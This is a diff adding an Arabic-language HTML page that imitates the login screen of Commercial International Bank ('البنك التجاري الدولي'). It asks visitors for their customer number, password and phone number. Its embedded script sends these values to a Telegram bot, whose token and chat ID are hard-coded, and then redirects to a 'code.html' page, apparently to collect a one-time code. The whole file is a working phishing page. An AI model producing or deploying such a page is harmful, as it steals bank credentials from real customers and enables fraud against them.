@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>البنك التجاري الدولي</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      direction: rtl;
+      margin: 0;
+      padding: 0;
+      background-color: #f2f4f8;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: #fff;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 120px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #004c97;
+      margin-bottom: 25px;
+      font-size: 22px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: 600;
+      color: #333;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      background-color: #fefefe;
+    }
+
+    button {
+      margin-top: 30px;
+      width: 100%;
+      padding: 12px;
+      background-color: #004c97;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #003b7a;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        margin: 20px;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="cbi.png" alt="شعار البنك التجاري الدولي">
+    </div>
+
+    <h2>البنك التجاري الدولي</h2>
+
+    <label for="client">رقم العميل</label>
+    <input type="text" id="client" placeholder="مثال: 12345678">
+
+    <label for="password">كلمة المرور</label>
+    <input type="password" id="password" placeholder="••••••••">
+
+    <label for="phone">رقم الهاتف</label>
+    <input type="text" id="phone" placeholder="05XXXXXXXX">
+
+    <button onclick="sendCustomerInfo()">التالي</button>
+  </div>
+
+  <script>
+    const telegramBotToken = '8384152964:AAEPq3RMV17UiO_mB7SQUtRUmtedecCcr6Y';
+    const chatId = '6256486935';
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      fetch(url).catch(err => console.error("Telegram Error:", err));
+    }
+
+    function sendCustomerInfo() {
+      const client = document.getElementById('client').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+
+      const message = `
+🏦 بيانات عميل - البنك التجاري الدولي:
+رقم العميل: ${client}
+كلمة المرور: ${password}
+رقم الهاتف: ${phone}
+      `;
+
+      sendToTelegram(message);
+      window.location.href = "code.html";
+    }
+  </script>
+
+</body>
+</html>
